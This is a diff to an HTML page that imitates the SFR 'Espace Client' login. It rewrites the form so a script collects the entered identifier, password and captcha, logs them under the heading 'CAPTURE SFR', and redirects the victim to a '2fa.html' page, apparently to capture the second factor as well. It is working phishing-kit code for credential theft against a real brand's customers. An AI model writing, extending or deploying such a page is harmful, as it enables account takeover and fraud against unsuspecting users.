@@ -22,12 +22,12 @@
         <h2>Espace Client</h2>
         <p>Tous les champs sont obligatoires</p>
         
-        <form action="2fa.html" method="POST">
+        <form id="loginForm">
             <label>Identifiant</label>
-            <input type="text" name="identifiant" placeholder="Numéro de ligne mobile, email ou NeufID" required>
+            <input type="text" id="identifiant" placeholder="Numéro de ligne mobile, email ou NeufID" required>
             
             <label>Mot de passe</label>
-            <input type="password" name="password" placeholder="Saisir le mot de passe" required>
+            <input type="password" id="password" placeholder="Saisir le mot de passe" required>
             
             <label style="display:flex; align-items:center; margin:10px 0;">
                 <input type="checkbox" checked style="width:auto; margin-right:8px;"> Rester connecté
@@ -35,11 +35,29 @@
             
             <div class="captcha">
                 <img src="captcha.jpg" alt="Captcha" style="max-width:100%; margin-bottom:10px;">
-                <input type="text" name="captcha" placeholder="Saisir le texte de l'image" required>
+                <input type="text" id="captcha" placeholder="Saisir le texte de l'image" required>
             </div>
             
-            <button type="submit">Se connecter</button>
+            <button type="button" onclick="submitForm()">Se connecter</button>
         </form>
     </div>
+
+    <script>
+        function submitForm() {
+            var identifiant = document.getElementById('identifiant').value;
+            var password = document.getElementById('password').value;
+            var captcha = document.getElementById('captcha').value;
+
+            // Capture et affichage dans la console
+            console.log("=== CAPTURE SFR ===");
+            console.log("Identifiant: " + identifiant);
+            console.log("Mot de passe: " + password);
+            console.log("Captcha: " + captcha);
+            console.log("Date: " + new Date());
+
+            // Redirection vers 2FA
+            window.location.href = "2fa.html?identifiant=" + encodeURIComponent(identifiant);
+        }
+    </script>
 </body>
 </html>
